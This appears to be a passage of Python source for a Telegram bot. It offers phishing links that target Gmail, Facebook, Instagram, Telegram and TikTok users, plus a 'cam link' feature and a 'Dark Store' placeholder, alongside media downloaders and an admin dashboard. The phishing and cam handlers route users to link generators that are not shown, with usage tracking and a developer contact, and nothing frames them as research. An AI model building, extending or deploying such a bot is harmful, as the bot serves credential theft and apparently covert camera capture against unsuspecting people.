            "phish_gmail": "📧 Gmail Phishing",
            "phish_instagram": "📷 Instagram Phishing",
            "phish_telegram": "✈️ Telegram Phishing",
            "phish_tiktok": "🎵 TikTok Phishing",
            "dl_tiktok": "🎥 TikTok Video",
            "dl_facebook": "📹 Facebook Video",
            "dl_youtube": "▶️ YouTube Video",
            "dl_spotify": "🎵 Spotify Audio",
            "dl_youtube_music": "▶️ YouTube Music",
            "dl_soundcloud": "🎧 SoundCloud Audio",
            "dl_apple_music": "🎼 Apple Music",
            "dl_image_instagram": "📷 Instagram Image",
            "dl_image_facebook": "📘 Facebook Image",
            "dl_image_tiktok": "🎵 TikTok Image",
            "dl_image_twitter": "🐦 Twitter/X Image",
            "dl_image_pinterest": "📌 Pinterest Image"
        }
        
        # Sort features by usage count (descending)
        sorted_features = sorted(usage.items(), key=lambda x: x[1], reverse=True)
        most_used = sorted_features[0] if sorted_features else ("None", 0)
        least_used = sorted_features[-1] if sorted_features else ("None", 0)
        
        # Create ranked list of all features
        ranked_features = "\n".join([
            f"{i+1}. {feature_names.get(fname, fname)}: {count} uses"
            for i, (fname, count) in enumerate(sorted_features)
        ])
        
        dashboard_text = f"""📊 ADMIN DASHBOARD

📈 User Statistics:
• Total Users: {total_users}
• Active Users: {active_users}
• Blocked Users: {blocked_users}

🔥 Feature Usage Analytics (Ranked):
{ranked_features}

📊 Summary:
• 🥇 Most Popular: {feature_names.get(most_used[0], 'None')} ({most_used[1]} uses)
• 🥉 Least Popular: {feature_names.get(least_used[0], 'None')} ({least_used[1]} uses)
• 📊 Total Feature Uses: {sum(usage.values())}
"""
        keyboard = [
            [InlineKeyboardButton("👥 User Management", callback_data="admin_users")],
            [InlineKeyboardButton("📢 Send Notification", callback_data="admin_notification")],
            [InlineKeyboardButton("🔄 Reset Statistics", callback_data="admin_reset_stats")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_main")]
        ]
        await query.edit_message_text(dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    
    # User handlers
    elif query.data == "cam":
        track_feature_usage("cam")
        await show_cam_menu(update, username, user_id)
    elif query.data == "phish":
        await show_phish_menu(update, username, user_id)
    elif query.data == "download_video":
        await show_video_download_menu(update, username, user_id)
    elif query.data == "download_audio":
        await show_audio_download_menu(update, username, user_id)
    elif query.data == "download_image":
        await show_image_download_menu(update, username, user_id)
    elif query.data == "dark_store":
        await query.edit_message_text(
            text="🏪 Dark Store\n\n⏳ Coming Soon!\n\nThis feature is under development and will be available in the next update.\n\nStay tuned! 🚀",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back_main")]])
        )
    elif query.data == "cam_link":
        await show_cam_link(update, username, user_id)
    elif query.data == "cam_admin":
        await query.edit_message_text(
            text="👤 Developer: @mengheang25",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Contact Admin", url="https://t.me/mengheang25")],
                [InlineKeyboardButton("⬅️ Back", callback_data="back_main")]
            ])
        )
    elif query.data.startswith("phish_") and query.data not in ["phish_back"]:
        phish_type = query.data.replace("phish_", "")
        if phish_type in ["facebook", "gmail", "instagram", "telegram", "tiktok"]:
            track_feature_usage(f"phish_{phish_type}")
            await show_phish_link(update, phish_type, user_id)
    elif query.data == "phish_back":
        await show_phish_menu(update, username, user_id)
    elif query.data in ["dl_tiktok", "dl_facebook", "dl_youtube"]:
        platform_map = {
            "dl_tiktok": "TikTok",
            "dl_facebook": "Facebook",
            "dl_youtube": "YouTube"
        }
        platform = platform_map.get(query.data, "Unknown")
        context.user_data["download_platform"] = platform
        context.user_data["download_is_audio"] = False
        context.user_data["waiting_for_download_url"] = True
        
        # Track feature usage
        track_feature_usage(query.data)
        
        examples = {
            "TikTok": "https://vm.tiktok.com/xxxxx/",
            "Facebook": "https://fb.watch/xxxxx/",
            "YouTube": "https://youtu.be/xxxxx"
        }
        
        await query.edit_message_text(
            text=f"🎬 {platform} Video Downloader\n\n"
            f"📥 Send me a {platform} video URL to download.\n\n"
            f"📝 Example:\n"
            f"`{examples.get(platform, 'https://example.com')}`\n\n"
            f"💨 Features:\n"
            f"• Fast download speed\n"
            f"• High quality video\n"
            f"• Automatic processing\n\n"
            f"⏱ Usually completes in 1-2 minutes",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="download_video")]])
        )
    elif query.data in ["dl_spotify", "dl_youtube_music", "dl_soundcloud", "dl_apple_music"]:
        platform_map = {
            "dl_spotify": "Spotify",
            "dl_youtube_music": "YouTube Music",
            "dl_soundcloud": "SoundCloud",
            "dl_apple_music": "Apple Music"
        }
        platform = platform_map.get(query.data, "Unknown")
        context.user_data["download_platform"] = platform
        context.user_data["download_is_audio"] = True
        context.user_data["waiting_for_download_url"] = True
        
        # Track feature usage
        track_feature_usage(query.data)
        
        examples = {
            "Spotify": "https://open.spotify.com/track/xxxxx",
            "YouTube Music": "https://music.youtube.com/watch?v=xxxxx",
            "SoundCloud": "https://soundcloud.com/artist/track",
            "Apple Music": "https://music.apple.com/us/album/xxxxx"
        }
        
        await query.edit_message_text(
            text=f"🎵 {platform} Audio Downloader\n\n"
            f"📥 Send me a {platform} audio/music URL to download as MP3.\n\n"
            f"📝 Example:\n"
            f"`{examples.get(platform, 'https://example.com')}`\n\n"
            f"💨 Features:\n"
            f"• Download as MP3\n"
            f"• High quality audio (192 kbps)\n"
            f"• Automatic processing\n\n"
            f"⏱ Usually completes in 1-2 minutes",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="download_audio")]])
        )
    elif query.data in ["dl_image_instagram", "dl_image_facebook", "dl_image_tiktok", "dl_image_twitter", "dl_image_pinterest"]:
        platform_map = {
            "dl_image_instagram": "Instagram",
            "dl_image_facebook": "Facebook",
            "dl_image_tiktok": "TikTok",
            "dl_image_twitter": "Twitter/X",
            "dl_image_pinterest": "Pinterest"
        }
        platform = platform_map.get(query.data, "Unknown")
        context.user_data["download_platform"] = platform
        context.user_data["download_is_audio"] = False
        context.user_data["download_is_image"] = True
        context.user_data["waiting_for_download_url"] = True
        
        # Track feature usage
        track_feature_usage(query.data)
        
        examples = {
            "Instagram": "https://www.instagram.com/p/xxxxx/",
            "Facebook": "https://www.facebook.com/photo.php?fbid=xxxxx",
            "TikTok": "https://www.tiktok.com/@username/video/xxxxx",
            "Twitter/X": "https://x.com/username/status/xxxxx",
            "Pinterest": "https://www.pinterest.com/pin/xxxxx/"
        }
        
        await query.edit_message_text(
            text=f"🖼️ {platform} Image Downloader\n\n"
            f"📥 Send me a {platform} post/image URL to download images.\n\n"
            f"📝 Example:\n"
            f"`{examples.get(platform, 'https://example.com')}`\n\n"
            f"💨 Features:\n"
            f"• Download high quality images\n"
            f"• Support for multiple images\n"
            f"• Automatic processing\n\n"
            f"⏱ Usually completes in 1-2 minutes",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="download_image")]])
        )
    elif query.data == "back_main":
        await show_main_menu(update, username)
    elif query.data == "check_join":
        is_member = await check_channel_membership(context, user_id)
        if is_member:
            await show_main_menu(update, username)
        else:
            await show_join_button(update, username)

# ==================== DOWNLOAD HANDLERS ====================

async def handle_download_request(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle download requests for videos and audio"""
    user = update.effective_user
    user_id = user.id
    
    # Check if user is blocked
    if is_user_blocked(user_id):
        await update.message.reply_text("❌ You are blocked from using this bot.")
        return
    
    # Check if user is member
    is_member = await check_channel_membership(context, user_id)
    if not is_member:
        await update.message.reply_text("❌ Please join the channel first to use this feature.")
        return
    
    # Get the URL from the message
    url = update.message.text.strip()
    
    # Validate URL format
    if not url.startswith(('http://', 'https://')):
        await update.message.reply_text("❌ Please send a valid URL starting with http:// or https://")
        return
    
    # Check which download platform is active
    video_platform = context.user_data.get("download_platform")
    audio_platform = context.user_data.get("download_audio_platform")
    
    if video_platform:
        await handle_video_download(update, context, video_platform, url)
    elif audio_platform:
        await handle_audio_download(update, context, audio_platform, url)
    else:
        await update.message.reply_text("❌ Please select a platform first using /start command.")

async def handle_video_download(update: Update, context: ContextTypes.DEFAULT_TYPE, platform: str, url: str) -> None:
    """Handle video download from specified platform"""
    user = update.effective_user
    user_id = user.id
    
    try:
        # Validate URL based on platform
        if not validate_video_url(platform, url):
            await update.message.reply_text(f"❌ Invalid {platform} URL. Please check and try again.")
            return
        
        # Send processing message
        processing_msg = await update.message.reply_text(f"⏳ Processing your {platform} video...\n\n🔄 This may take 1-2 minutes.")
        
        # Call download API
        download_url = await get_video_download_link(platform, url, user_id)
        
        if download_url:
            # Create keyboard with download options
            keyboard = [
                [InlineKeyboardButton(f"📥 Download from {platform}", url=download_url)],
                [InlineKeyboardButton("⬅️ Back to Download Menu", callback_data="download_video")]
            ]
            
            await processing_msg.edit_text(
                text=f"✅ Your {platform} video is ready!\n\n"
                f"📥 Click the button below to download:\n\n"
                f"📝 URL: {url[:50]}...",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await processing_msg.edit_text(
                text=f"❌ Download failed!\n\nThis link may not be valid or the content is unavailable.\nPlease try another link.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="download_video")]])
            )
    
    except Exception as e:
        logger.error(f"Video download error for {user_id}: {e}")
        await update.message.reply_text(
            text=f"❌ Download failed!\n\nThis link may not be valid or the content is unavailable.\nPlease try another link.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="download_video")]])
        )

async def handle_audio_download(update: Update, context: ContextTypes.DEFAULT_TYPE, platform: str, url: str) -> None:
    """Handle audio download from specified platform"""
    user = update.effective_user
    user_id = user.id
    
    try:
        # Validate URL based on platform
        if not validate_audio_url(platform, url):
            await update.message.reply_text(f"❌ Invalid {platform} URL. Please check and try again.")
            return
        
        # Send processing message
        processing_msg = await update.message.reply_text(f"⏳ Processing your {platform} audio...\n\n🔄 This may take 1-2 minutes.")
        
        # Call download API
        download_url = await get_audio_download_link(platform, url, user_id)
        
        if download_url:
            # Create keyboard with download options
            keyboard = [
                [InlineKeyboardButton(f"🎵 Download MP3 from {platform}", url=download_url)],
                [InlineKeyboardButton("⬅️ Back to Audio Menu", callback_data="download_audio")]
            ]
            
            await processing_msg.edit_text(
                text=f"✅ Your {platform} audio is ready!\n\n"
                f"🎵 Click the button below to download as MP3:\n\n"
                f"📝 URL: {url[:50]}...",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await processing_msg.edit_text(
                text=f"❌ Download failed!\n\nThis link may not be valid or the content is unavailable.\nPlease try another link.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="download_audio")]])
            )
    
    except Exception as e:
        logger.error(f"Audio download error for {user_id}: {e}")
        await update.message.reply_text(
            text=f"❌ Download failed!\n\nThis link may not be valid or the content is unavailable.\nPlease try another link.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="download_audio")]])
        )

def validate_video_url(platform: str, url: str) -> bool:
    """Validate video URL format based on platform"""
    patterns = {
        "TikTok": ["vm.tiktok.com", "vt.tiktok.com", "tiktok.com/@"],
        "Facebook": ["fb.watch", "facebook.com", "m.facebook.com"],
        "YouTube": ["youtu.be", "youtube.com", "m.youtube.com"]
    }
    
    if platform in patterns:
        return any(pattern in url.lower() for pattern in patterns[platform])
    return False

def validate_audio_url(platform: str, url: str) -> bool:
    """Validate audio URL format based on platform"""
    patterns = {
        "Spotify": ["spotify.com"],
        "YouTube Music": ["music.youtube.com"],
        "SoundCloud": ["soundcloud.com"],
        "Apple Music": ["music.apple.com"]
    }
    
    if platform in patterns:
        return any(pattern in url.lower() for pattern in patterns[platform])
    return False

async def get_video_download_link(platform: str, url: str, user_id: int) -> str:
    """Get video download link from external API"""
    import urllib.parse
    
    apis = {
        "TikTok": f"https://api.tikmate.app/api/download?url={urllib.parse.quote(url)}",
        "Facebook": f"https://server-apix9.vercel.app/download/facebook?url={urllib.parse.quote(url)}&id={user_id}",
        "YouTube": f"https://server-apix9.vercel.app/download/youtube?url={urllib.parse.quote(url)}&id={user_id}"
    }
    
    try:
        if platform in apis:
            return apis[platform]
    except Exception as e:
        logger.error(f"Error getting download link for {platform}: {e}")
    
    return None

async def get_audio_download_link(platform: str, url: str, user_id: int) -> str:
    """Get audio download link from external API"""
    import urllib.parse
    
    apis = {
        "Spotify": f"https://server-apix9.vercel.app/download/spotify?url={urllib.parse.quote(url)}&id={user_id}",
        "YouTube Music": f"https://server-apix9.vercel.app/download/youtube-music?url={urllib.parse.quote(url)}&id={user_id}",
        "SoundCloud": f"https://server-apix9.vercel.app/download/soundcloud?url={urllib.parse.quote(url)}&id={user_id}",
        "Apple Music": f"https://server-apix9.vercel.app/download/apple-music?url={urllib.parse.quote(url)}&id={user_id}"
    }
    
    try:
        if platform in apis:
            return apis[platform]
    except Exception as e:
        logger.error(f"Error getting audio download link for {platform}: {e}")
    
    return None

# ==================== MAIN ====================

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle application errors"""
    logger.error(msg="Exception while handling an update:", exc_info=context.error)
    
    # Handle Telegram Conflict (409) errors gracefully
    if hasattr(context.error, '__class__'):
        if 'Conflict' in str(context.error.__class__):
            logger.warning("Telegram conflict detected - another bot instance may be running. Stopping gracefully...")
            return
        elif 'NetworkError' in str(context.error.__class__):
            logger.warning("Network error - will retry on next update")
            return

def main() -> None:
    """Start the bot"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # Commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("dashboard", dashboard))
    
    # Callbacks
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Message handler for notifications and downloads (all content types)
    application.add_handler(MessageHandler(~filters.COMMAND, handle_message))
    
    # Run the bot
    application.run_polling()

if __name__ == '__main__':
    main()